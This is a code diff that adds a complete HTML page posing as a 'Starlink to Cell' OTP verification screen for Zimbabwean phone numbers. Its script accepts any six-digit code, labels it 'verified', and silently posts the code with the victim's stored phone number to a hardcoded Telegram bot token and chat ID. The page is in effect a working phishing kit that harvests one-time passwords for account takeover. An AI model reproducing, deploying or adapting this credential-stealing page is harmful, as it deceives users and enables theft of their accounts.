@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starlink to Cell - Verify OTP</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f5f7fa;
+            overflow-x: hidden;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .main-container {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .logo {
+            text-align: center;
+            padding: 20px 20px 30px;
+            width: 100%;
+        }
+        
+        .logo-text {
+            font-size: 36px;
+            font-weight: 700;
+        }
+        
+        .logo-starlink {
+            color: #18386d;
+        }
+        
+        .logo-cell {
+            color: #ff3b00;
+        }
+        
+        .verify-card {
+            background: white;
+            border-radius: 24px;
+            padding: 35px 28px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .subtitle span {
+            color: #18386d;
+            font-weight: 600;
+        }
+        
+        .info-box {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 14px 18px;
+            text-align: left;
+            margin-bottom: 25px;
+            border: 1px solid #eef0f5;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+        }
+        
+        .info-item:first-child {
+            border-bottom: 1px solid #eef0f5;
+            padding-bottom: 10px;
+            margin-bottom: 6px;
+        }
+        
+        .info-label {
+            color: #888;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .info-value {
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .phone-display {
+            color: #18386d;
+            font-size: 15px;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .status-badge.verified {
+            background: #e8f5e9;
+            color: #27ae60;
+        }
+        
+        .otp-input-wrapper {
+            background: #f8f9ff;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #eef0f5;
+        }
+        
+        .otp-input-wrapper label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+            margin-bottom: 12px;
+            text-align: left;
+        }
+        
+        .otp-input-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        
+        .otp-input {
+            width: 55px;
+            height: 65px;
+            border: 2px solid #dce0e8;
+            border-radius: 14px;
+            font-size: 28px;
+            text-align: center;
+            font-weight: 700;
+            color: #333;
+            background: white;
+            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .otp-input:focus {
+            border-color: #18386d;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(24, 56, 109, 0.12);
+            transform: scale(1.02);
+        }
+        
+        .otp-input.filled {
+            border-color: #27ae60;
+            background: #f0fff4;
+        }
+        
+        .otp-input.error {
+            border-color: #e74c3c !important;
+            animation: shake 0.4s ease;
+            background: #fff5f5;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-8px); }
+            80% { transform: translateX(8px); }
+        }
+        
+        .resend-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 8px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #18386d;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 6px 12px;
+            border-radius: 8px;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        
+        .resend-btn:hover:not(:disabled) {
+            background: #f0f4ff;
+        }
+        
+        .resend-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        
+        .resend-timer {
+            font-size: 14px;
+            color: #999;
+            font-weight: 500;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #18386d, #0f2852);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            margin-bottom: 12px;
+            position: relative;
+        }
+        
+        .btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(24, 56, 109, 0.35);
+        }
+        
+        .btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .btn .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #27ae60, #1e8449);
+        }
+        
+        .btn-success:hover:not(:disabled) {
+            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.35);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: #18386d;
+            border: 2px solid #18386d;
+            margin-bottom: 0;
+        }
+        
+        .btn-outline:hover:not(:disabled) {
+            background: #18386d;
+            color: white;
+            box-shadow: 0 8px 25px rgba(24, 56, 109, 0.2);
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 12px;
+            display: none;
+            font-weight: 500;
+            padding: 10px;
+            background: #fff5f5;
+            border-radius: 10px;
+            border: 1px solid #fce4ec;
+        }
+        
+        .error-message.show {
+            display: block;
+            animation: slideUp 0.3s ease;
+        }
+        
+        .error-message.success {
+            background: #e8f5e9;
+            border-color: #c8e6c9;
+            color: #27ae60;
+        }
+        
+        .bottom-section {
+            background: #18386d;
+            color: white;
+            padding: 50px 30px 35px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            margin-top: 0;
+        }
+        
+        .bottom-text {
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+        
+        .bottom-btns {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+        }
+        
+        .bottom-btn {
+            background: white;
+            color: #18386d;
+            border: none;
+            border-radius: 30px;
+            padding: 14px 28px;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            width: 140px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .bottom-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
+        }
+        
+        .btn-icon {
+            font-size: 22px;
+        }
+        
+        .version {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-bottom: 10px;
+        }
+        
+        .terms {
+            font-size: 12px;
+            opacity: 0.85;
+            line-height: 1.5;
+        }
+        
+        .terms a {
+            color: white;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        .terms a:hover {
+            opacity: 0.8;
+        }
+        
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.97);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0f0f0;
+            border-top: 5px solid #18386d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .spinner-text {
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 280px;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .logo-text { font-size: 28px; }
+            .verify-card { padding: 25px 18px; }
+            .title { font-size: 20px; margin-bottom: 20px; }
+            .otp-input { width: 45px; height: 55px; font-size: 22px; }
+            .otp-input-row { gap: 8px; }
+            .info-item { flex-direction: column; align-items: flex-start; gap: 2px; }
+            .bottom-section { padding: 35px 20px 25px; }
+            .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
+            .logo { padding: 10px 20px 20px; }
+        }
+        
+        @media (max-width: 380px) {
+            .otp-input { width: 38px; height: 48px; font-size: 18px; }
+            .otp-input-row { gap: 6px; }
+            .bottom-btn { width: 100px; padding: 10px 12px; font-size: 12px; }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="main-container">
+        <!-- Logo -->
+        <div class="logo">
+            <div class="logo-text">
+                <span class="logo-starlink">Starlink</span><span class="logo-cell">Cell</span>
+            </div>
+        </div>
+
+        <!-- Verify Card -->
+        <div class="verify-card">
+            <h1 class="title">Verify OTP</h1>
+            <p class="subtitle">Enter the 6-digit code sent to <span id="displayPhone">+263 77 123 4567</span></p>
+
+            <!-- Phone & Status Info -->
+            <div class="info-box">
+                <div class="info-item">
+                    <span class="info-label">📱 Phone Number</span>
+                    <span class="info-value phone-display" id="phoneDisplay">+263 77 123 4567</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">🔐 Status</span>
+                    <span class="info-value">
+                        <span class="status-badge verified">✓ Verified</span>
+                    </span>
+                </div>
+            </div>
+
+            <!-- OTP Input -->
+            <div class="otp-input-wrapper">
+                <label>Enter 6-digit OTP</label>
+                <div class="otp-input-row" id="otpContainer">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                </div>
+                
+                <div class="resend-section">
+                    <button class="resend-btn" id="resendBtn">Resend OTP</button>
+                    <span class="resend-timer" id="resendTimer"></span>
+                </div>
+            </div>
+
+            <!-- Error Message -->
+            <div class="error-message" id="errorMessage"></div>
+
+            <!-- Verify Button -->
+            <button class="btn" id="verifyBtn">VERIFY & CONTINUE</button>
+            <button class="btn btn-outline" onclick="window.location.href='index.html'">← Back to Home</button>
+        </div>
+
+        <!-- Bottom Section -->
+        <div class="bottom-section">
+            <div class="bottom-text">
+                Need help with your OTP? <br>
+                Contact support for assistance.
+            </div>
+            <div class="bottom-btns">
+                <div class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
+                    <span class="btn-icon">ℹ️</span>
+                    Help
+                </div>
+                <div class="bottom-btn" onclick="alert('Contact support: support@starlinkcell.com')">
+                    <span class="btn-icon">📧</span>
+                    Support
+                </div>
+            </div>
+            <div class="version">v1.0</div>
+            <div class="terms">
+                By continuing you agree to the <a onclick="alert('Terms and Conditions')">Terms and Conditions</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Spinner Overlay -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text">
+            Please wait...<br> This usually takes a few seconds
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // TELEGRAM CREDENTIALS
+        // ============================================
+        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
+        const CHAT_ID = '8392790531';
+
+        console.log('====================================');
+        console.log('📡 Starlink to Cell - OTP Verification');
+        console.log('====================================');
+        console.log('🤖 Bot Token:', BOT_TOKEN);
+        console.log('📱 Chat ID:', CHAT_ID);
+        console.log('====================================');
+
+        // ============================================
+        // CONFIGURATION
+        // ============================================
+        const OTP_LENGTH = 6;
+
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const resendBtn = document.getElementById('resendBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const displayPhone = document.getElementById('displayPhone');
+        const resendTimer = document.getElementById('resendTimer');
+
+        // ============================================
+        // STATE
+        // ============================================
+        let otpValue = '';
+        let isProcessing = false;
+
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        const storedPhone = localStorage.getItem('phone') || '771234567';
+        const formattedPhone = '+263 ' + storedPhone.slice(0, 2) + ' ' + storedPhone.slice(2, 5) + ' ' + storedPhone.slice(5);
+        displayPhone.textContent = formattedPhone;
+
+        // Disable resend timer since no cooldown
+        resendTimer.textContent = '';
+
+        // ============================================
+        // SEND OTP TO TELEGRAM
+        // ============================================
+        function sendOTPToTelegram(otp) {
+            const phone = localStorage.getItem('phone') || '771234567';
+            const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+
+            console.log('📤 Sending OTP to Telegram...');
+            console.log('📝 Message:', message);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                console.log('📥 Response Status:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ OTP sent to Telegram successfully!');
+                } else {
+                    console.error('❌ Telegram Error:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('❌ Fetch Error:', error.message);
+            });
+        }
+
+        // ============================================
+        // OTP INPUT HANDLING
+        // ============================================
+        function getOTPValue() {
+            return Array.from(otpInputs).map(input => input.value).join('');
+        }
+
+        function setOTPValue(value) {
+            const digits = value.split('').slice(0, OTP_LENGTH);
+            otpInputs.forEach((input, index) => {
+                input.value = digits[index] || '';
+                if (input.value) {
+                    input.classList.add('filled');
+                } else {
+                    input.classList.remove('filled');
+                }
+            });
+            otpValue = getOTPValue();
+            checkOTPComplete();
+        }
+
+        function checkOTPComplete() {
+            const value = getOTPValue();
+            verifyBtn.disabled = value.length !== OTP_LENGTH;
+        }
+
+        function clearOTPInputs() {
+            otpInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled', 'error');
+            });
+            otpValue = '';
+            errorMessage.classList.remove('show');
+            checkOTPComplete();
+            otpInputs[0].focus();
+        }
+
+        // OTP Input Events
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/\D/g, '');
+                
+                if (input.value) {
+                    input.classList.add('filled');
+                    input.classList.remove('error');
+                } else {
+                    input.classList.remove('filled');
+                }
+                
+                if (input.value.length === 1 && index < OTP_LENGTH - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                
+                otpValue = getOTPValue();
+                checkOTPComplete();
+                
+                if (otpValue.length === OTP_LENGTH) {
+                    setTimeout(() => {
+                        verifyBtn.click();
+                    }, 300);
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                    otpInputs[index - 1].classList.remove('filled');
+                }
+                
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+                
+                if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text');
+                const numbers = data.replace(/\D/g, '');
+                setOTPValue(numbers);
+                const lastIndex = Math.min(numbers.length - 1, OTP_LENGTH - 1);
+                if (lastIndex >= 0) {
+                    otpInputs[lastIndex].focus();
+                }
+            });
+
+            input.addEventListener('focus', () => {
+                input.select();
+            });
+        });
+
+        // ============================================
+        // VERIFY OTP
+        // ============================================
+        verifyBtn.addEventListener('click', function() {
+            const otp = getOTPValue();
+            
+            if (otp.length !== OTP_LENGTH) {
+                errorMessage.textContent = '⚠️ Please enter all 6 digits.';
+                errorMessage.className = 'error-message show';
+                return;
+            }
+
+            isProcessing = true;
+            this.disabled = true;
+            this.innerHTML = '<span class="loader"></span> VERIFYING...';
+            errorMessage.classList.remove('show');
+
+            // ============================================
+            // ✅ ACCEPT ANY 6-DIGIT OTP
+            // ============================================
+            setTimeout(() => {
+                // Send OTP to Telegram
+                sendOTPToTelegram(otp);
+
+                // Any 6-digit OTP is accepted
+                this.innerHTML = '✅ VERIFIED';
+                this.classList.add('btn-success');
+                
+                localStorage.setItem('verified', 'true');
+                localStorage.setItem('otpVerified', 'true');
+                
+                errorMessage.textContent = '✅ OTP Verified Successfully!';
+                errorMessage.className = 'error-message success show';
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+                
+                isProcessing = false;
+            }, 1200);
+        });
+
+        // ============================================
+        // RESEND OTP - Simple version, no cooldown
+        // ============================================
+        resendBtn.addEventListener('click', function() {
+            if (isProcessing) return;
+            
+            clearOTPInputs();
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'VERIFY & CONTINUE';
+            verifyBtn.classList.remove('btn-success');
+            
+            errorMessage.textContent = '✅ New OTP sent successfully!';
+            errorMessage.className = 'error-message success show';
+            
+            setTimeout(() => {
+                errorMessage.classList.remove('show');
+            }, 3000);
+            
+            otpInputs[0].focus();
+        });
+
+        // ============================================
+        // KEYBOARD SHORTCUTS
+        // ============================================
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !verifyBtn.disabled) {
+                verifyBtn.click();
+            }
+            if (e.key === 'Escape') {
+                clearOTPInputs();
+            }
+        });
+
+        // ============================================
+        // START
+        // ============================================
+        otpInputs[0].focus();
+        checkOTPComplete();
+
+        console.log('✅ ANY 6-DIGIT OTP WILL BE ACCEPTED');
+        console.log('📞 Phone:', formattedPhone);
+        console.log('====================================');
+    </script>
+
+</body>
+
+</html>
